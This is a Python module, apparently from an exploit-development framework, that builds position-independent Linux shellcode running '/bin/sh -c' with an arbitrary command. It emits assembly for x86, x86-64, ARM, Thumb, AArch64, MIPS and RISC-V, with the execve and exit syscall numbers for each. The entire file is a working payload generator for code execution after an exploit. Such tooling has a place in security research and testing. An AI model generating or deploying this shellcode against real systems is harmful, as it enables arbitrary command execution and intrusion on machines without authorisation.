"""Position-independent Linux shellcode payloads for the primary target matrix."""

from __future__ import annotations

from dataclasses import dataclass

from .assembler import LLVMAssembler
from .errors import UnsupportedTargetError
from .model import MemoryRequirement, Payload, PayloadKind, Permission
from .target import Architecture, Target


_MAX_STACK_IMAGE = 1792


def _align(value: int, alignment: int) -> int:
    return (value + alignment - 1) & -alignment


@dataclass(frozen=True, slots=True)
class _ExecveStack:
    data: bytes
    path_offset: int
    dash_c_offset: int
    command_offset: int
    argv_offset: int
    frame_size: int


def _append_cstring(image: bytearray, value: bytes, alignment: int) -> int:
    offset = _align(len(image), alignment)
    image.extend(b"\0" * (offset - len(image)))
    image.extend(value)
    image.append(0)
    image.extend(b"\0" * (_align(len(image), alignment) - len(image)))
    return offset


def _execve_stack(target: Target, command: str | bytes) -> _ExecveStack:
    encoded = command.encode() if isinstance(command, str) else bytes(command)
    if not encoded:
        raise ValueError("command cannot be empty")
    if b"\0" in encoded:
        raise ValueError("command cannot contain a NUL byte")

    image = bytearray()
    path_offset = _append_cstring(image, b"/bin/sh", target.word_size)
    dash_c_offset = _append_cstring(image, b"-c", target.word_size)
    command_offset = _append_cstring(image, encoded, target.word_size)
    argv_offset = _align(len(image), target.word_size)
    image.extend(b"\0" * (argv_offset - len(image) + 4 * target.word_size))
    frame_size = _align(len(image), target.convention.stack_alignment)
    image.extend(b"\0" * (frame_size - len(image)))
    if frame_size > _MAX_STACK_IMAGE:
        raise ValueError(f"command stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
    return _ExecveStack(bytes(image), path_offset, dash_c_offset, command_offset, argv_offset, frame_size)


def _word_chunks(target: Target, data: bytes) -> list[tuple[int, int]]:
    return [
        (offset, int.from_bytes(data[offset : offset + target.word_size], target.endian.value))
        for offset in range(0, len(data), target.word_size)
    ]


def _header(target: Target) -> list[str]:
    lines = [".text"]
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.append(".intel_syntax noprefix")
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(
            (".syntax unified", ".arch armv7-a", ".thumb" if target.arch is Architecture.THUMB else ".arm")
        )
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend((".set noreorder", ".set nomips16"))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.append(".option norvc")
    lines.append(".globl _start")
    if target.arch is Architecture.THUMB:
        lines.append(".thumb_func")
    lines.append("_start:")
    return lines


def _x86_execve(target: Target, stack: _ExecveStack) -> list[str]:
    is_64 = target.arch is Architecture.X86_64
    sp = "rsp" if is_64 else "esp"
    accumulator = "rax" if is_64 else "eax"
    word = "qword" if is_64 else "dword"
    lines = [f"sub {sp}, {stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.append(f"mov {accumulator}, 0x{value:x}")
        lines.append(f"mov {word} ptr [{sp} + {offset}], {accumulator}")

    pointer = "rax" if is_64 else "eax"
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.append(f"lea {pointer}, [{sp} + {offset}]")
        lines.append(f"mov {word} ptr [{sp} + {stack.argv_offset + index * target.word_size}], {pointer}")
    if is_64:
        lines.extend(
            (
                f"lea rdi, [rsp + {stack.path_offset}]",
                f"lea rsi, [rsp + {stack.argv_offset}]",
                "xor edx, edx",
                "mov eax, 59",
                "syscall",
                "mov edi, 127",
                "mov eax, 60",
                "syscall",
            )
        )
    else:
        lines.extend(
            (
                f"lea ebx, [esp + {stack.path_offset}]",
                f"lea ecx, [esp + {stack.argv_offset}]",
                "xor edx, edx",
                "mov eax, 11",
                "int 0x80",
                "mov ebx, 127",
                "mov eax, 1",
                "int 0x80",
            )
        )
    return lines


def _arm_execve(target: Target, stack: _ExecveStack) -> list[str]:
    suffix = ".w" if target.arch is Architecture.THUMB else ""
    lines = [f"sub{suffix} sp, sp, #{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(
            (
                f"movw r12, #{value & 0xFFFF}",
                f"movt r12, #{value >> 16}",
                f"str{suffix} r12, [sp, #{offset}]",
            )
        )
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"add{suffix} r3, sp, #{offset}",
                f"str{suffix} r3, [sp, #{stack.argv_offset + index * target.word_size}]",
            )
        )
    lines.extend(
        (
            f"add{suffix} r0, sp, #{stack.path_offset}",
            f"add{suffix} r1, sp, #{stack.argv_offset}",
            "eor r2, r2, r2",
            "movw r7, #11",
            "svc #0",
            "movw r0, #127",
            "movw r7, #1",
            "svc #0",
        )
    )
    return lines


def _aarch64_load(register: str, value: int) -> list[str]:
    parts = [(value >> shift) & 0xFFFF for shift in range(0, 64, 16)]
    if not any(parts):
        return [f"mov {register}, xzr"]
    first = next(index for index, part in enumerate(parts) if part)
    lines = [f"movz {register}, #{parts[first]}, lsl #{first * 16}"]
    lines.extend(
        f"movk {register}, #{part}, lsl #{index * 16}"
        for index, part in enumerate(parts)
        if part and index != first
    )
    return lines


def _aarch64_execve(target: Target, stack: _ExecveStack) -> list[str]:
    lines = [f"sub sp, sp, #{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend(_aarch64_load("x9", value))
        lines.append(f"str x9, [sp, #{offset}]")
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend((f"add x9, sp, #{offset}", f"str x9, [sp, #{stack.argv_offset + index * 8}]"))
    lines.extend(
        (
            f"add x0, sp, #{stack.path_offset}",
            f"add x1, sp, #{stack.argv_offset}",
            "mov x2, xzr",
            "mov x8, #221",
            "svc #0",
            "mov x0, #127",
            "mov x8, #93",
            "svc #0",
        )
    )
    return lines


def _mips_execve(target: Target, stack: _ExecveStack) -> list[str]:
    is_64 = target.arch is Architecture.MIPS64
    add = "daddiu" if is_64 else "addiu"
    load = "dli" if is_64 else "li"
    store = "sd" if is_64 else "sw"
    execve_number = 5057 if is_64 else 4011
    exit_number = 5058 if is_64 else 4001
    lines = [f"{add} $sp, $sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"{load} $t0, 0x{value:x}", f"{store} $t0, {offset}($sp)"))
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (
                f"{add} $t1, $sp, {offset}",
                f"{store} $t1, {stack.argv_offset + index * target.word_size}($sp)",
            )
        )
    lines.extend(
        (
            f"{add} $a0, $sp, {stack.path_offset}",
            f"{add} $a1, $sp, {stack.argv_offset}",
            f"{add} $a2, $zero, 0",
            f"{load} $v0, {execve_number}",
            "syscall",
            "nop",
            f"{add} $a0, $zero, 127",
            f"{load} $v0, {exit_number}",
            "syscall",
            "nop",
        )
    )
    return lines


def _riscv_execve(target: Target, stack: _ExecveStack) -> list[str]:
    is_64 = target.arch is Architecture.RISCV64
    store = "sd" if is_64 else "sw"
    lines = [f"addi sp, sp, -{stack.frame_size}"]
    for offset, value in _word_chunks(target, stack.data):
        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
    for index, offset in enumerate((stack.path_offset, stack.dash_c_offset, stack.command_offset)):
        lines.extend(
            (f"addi t1, sp, {offset}", f"{store} t1, {stack.argv_offset + index * target.word_size}(sp)")
        )
    lines.extend(
        (
            f"addi a0, sp, {stack.path_offset}",
            f"addi a1, sp, {stack.argv_offset}",
            "li a2, 0",
            "li a7, 221",
            "ecall",
            "li a0, 127",
            "li a7, 93",
            "ecall",
        )
    )
    return lines


def command_source(command: str | bytes, target: Target) -> tuple[str, int]:
    """Lower ``execve('/bin/sh', ['sh', '-c', command], NULL)`` to assembly."""

    stack = _execve_stack(target, command)
    lines = _header(target)
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        lines.extend(_x86_execve(target, stack))
    elif target.arch in {Architecture.ARM, Architecture.THUMB}:
        lines.extend(_arm_execve(target, stack))
    elif target.arch is Architecture.ARM64:
        lines.extend(_aarch64_execve(target, stack))
    elif target.arch in {Architecture.MIPS32, Architecture.MIPS64}:
        lines.extend(_mips_execve(target, stack))
    elif target.arch in {Architecture.RISCV32, Architecture.RISCV64}:
        lines.extend(_riscv_execve(target, stack))
    else:
        raise UnsupportedTargetError(f"command shellcode is not implemented for {target.name}")
    return "\n".join(lines) + "\n", stack.frame_size


def command_shellcode(
    command: str | bytes,
    target: Target,
    *,
    assembler: LLVMAssembler | None = None,
) -> Payload:
    """Build position-independent command shellcode for a fully resolved target."""

    source, stack_size = command_source(command, target)
    data = (assembler or LLVMAssembler()).assemble(source, target)
    needs_cache_sync = target.arch not in {Architecture.X86, Architecture.X86_64}
    if target.arch in {Architecture.X86, Architecture.X86_64}:
        instruction_alignment = 1
    elif target.arch is Architecture.THUMB:
        instruction_alignment = 2
    else:
        instruction_alignment = 4
    return Payload(
        data=data,
        target=target,
        kind=PayloadKind.SHELLCODE,
        description="execve /bin/sh -c command shellcode",
        memory=(
            MemoryRequirement(
                len(data),
                Permission.READ | Permission.EXECUTE,
                "shellcode bytes",
                alignment=instruction_alignment,
            ),
            MemoryRequirement(
                stack_size,
                Permission.READ | Permission.WRITE,
                "temporary execve stack image",
                alignment=target.convention.stack_alignment,
            ),
        ),
        metadata={
            "operation": "run-command",
            "syscall": "execve",
            "position_independent": True,
            "requires_instruction_cache_sync_after_runtime_write": needs_cache_sync,
            "assembly": source,
        },
    )


__all__ = ["command_shellcode", "command_source"]
